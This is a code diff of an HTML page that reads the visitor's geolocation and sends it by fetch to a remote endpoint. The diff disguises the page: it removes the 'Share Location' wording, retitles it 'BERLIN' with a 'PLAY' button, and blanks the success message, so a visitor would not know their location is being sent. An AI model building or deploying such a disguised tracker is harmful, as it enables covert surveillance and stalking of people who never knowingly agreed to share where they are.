@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Location Sharing</title>
+    <title></title>
     <style>
         body {
             background-color: black;
@@ -13,8 +13,8 @@
     </style>
 </head>
 <body>
-    <h1>Share Your Location</h1>
-    <button onclick="getLocation()">Share Location</button>
+    <h1>BERLIN</h1>
+    <button onclick="getLocation()">PLAY</button>
     <p id="status"></p>
 
     <script>
@@ -51,19 +51,20 @@
                 body: JSON.stringify(data)
             })
             .then(response => {
-                console.log('Response:', response);
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
                 return response.json();
             })
             .then(data => {
-                console.log('Data:', data);
                 if (data.ok) {
-                    document.getElementById("status").textContent = "Location sent successfully!";
+                    document.getElementById("status").textContent = "";
                 } else {
-                    document.getElementById("status").textContent = "Failed to send location: " + data.description;
+                    document.getElementById("status").textContent = "Faild: " + data.description;
                 }
             })
             .catch(error => {
-                document.getElementById("status").textContent = "Error sending location.";
+                document.getElementById("status").textContent = "Error sending: " + error.message;
                 console.error('Error:', error);
             });
         }
@@ -71,13 +72,13 @@
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    document.getElementById("status").textContent = "User denied the request for Geolocation.";
+                    document.getElementById("status").textContent = "User denied the request";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    document.getElementById("status").textContent = "Location information is unavailable.";
+                    document.getElementById("status").textContent = "information is unavailable.";
                     break;
                 case error.TIMEOUT:
-                    document.getElementById("status").textContent = "The request to get user location timed out.";
+                    document.getElementById("status").textContent = "The request to get user timeout .";
                     break;
                 case error.UNKNOWN_ERROR:
                     document.getElementById("status").textContent = "An unknown error occurred.";
